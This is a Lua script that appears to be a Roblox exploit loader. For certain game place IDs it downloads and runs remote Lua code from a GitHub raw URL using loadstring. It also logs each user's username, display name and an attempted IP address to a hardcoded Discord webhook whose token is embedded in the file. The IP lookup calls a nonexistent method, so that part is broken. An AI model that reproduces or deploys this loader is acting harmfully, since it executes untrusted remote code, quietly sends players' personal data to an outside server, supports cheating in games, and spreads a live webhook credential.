local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local PlaceId = game.PlaceId

-- Discord Webhook URL (replace with your actual webhook URL)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1350520350873751666/k-mizxBK5l1FzEn4CyIcAFkg0GUop79bESBgpQunuUKyOWfExBmeRtCYQpblVnsN1HLN"

-- Function to send logs to Discord webhook
local function sendToDiscordWebhook(data)
    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data))
    end)
    if not success then
        warn("Failed to send webhook:", response)
    end
end

-- Function to get the player's IP address (note: this is not reliable for security purposes)
local function getPlayerIP(player)
    local success, ip = pcall(function()
        return player:GetRemoteEvent("GetIP"):InvokeServer()
    end)
    return success and ip or "Unknown"
end

-- Get player information
local player = Players.LocalPlayer
local playerName = player.Name
local playerDisplayName = player.DisplayName
local playerIP = getPlayerIP(player)

-- Log PlaceId and UniverseID
print("Current PlaceId:", PlaceId)

local success, response = pcall(function()
    return HttpService:JSONDecode(game:HttpGet("https://apis.roblox.com/universes/v1/places/"..PlaceId.."/universe"))
end)

local UniverseID = success and response.universeId or nil
print("UniverseID:", UniverseID or "Failed to retrieve")

-- Determine which script to load
local scriptToLoad = nil
if PlaceId == 16732694052 then
    print("Loading fisch")
    scriptToLoad = "fisch"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ostkakan1337/script/refs/heads/main/fisch.lua"))()
elseif PlaceId == 13643807539 then
    print("Loading south bronx")
    scriptToLoad = "southbronx"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ostkakan1337/script/refs/heads/main/southbronx.lua"))()
elseif UniverseID == 1234 then
    print("WIP - Universe Match")
    scriptToLoad = "universe_match"
else
    print("WIP - No Match")
    scriptToLoad = "no_match"
end

-- Prepare data for the webhook
local embed = {
    {
        title = "Script Loader Log",
        description = "A user has loaded a script.",
        color = 0x00FF00, -- Green color
        fields = {
            {
                name = "Roblox Username",
                value = playerName,
                inline = true
            },
            {
                name = "Display Name",
                value = playerDisplayName,
                inline = true
            },
            {
                name = "IP Address",
                value = playerIP,
                inline = true
            },
            {
                name = "PlaceId",
                value = tostring(PlaceId),
                inline = true
            },
            {
                name = "UniverseID",
                value = tostring(UniverseID or "N/A"),
                inline = true
            },
            {
                name = "Script Loaded",
                value = scriptToLoad or "N/A",
                inline = true
            }
        },
        footer = {
            text = "Script Loader Logs"
        },
        timestamp = DateTime.now():ToIsoDate()
    }
}

-- Send the log to Discord
sendToDiscordWebhook({
    embeds = embed
})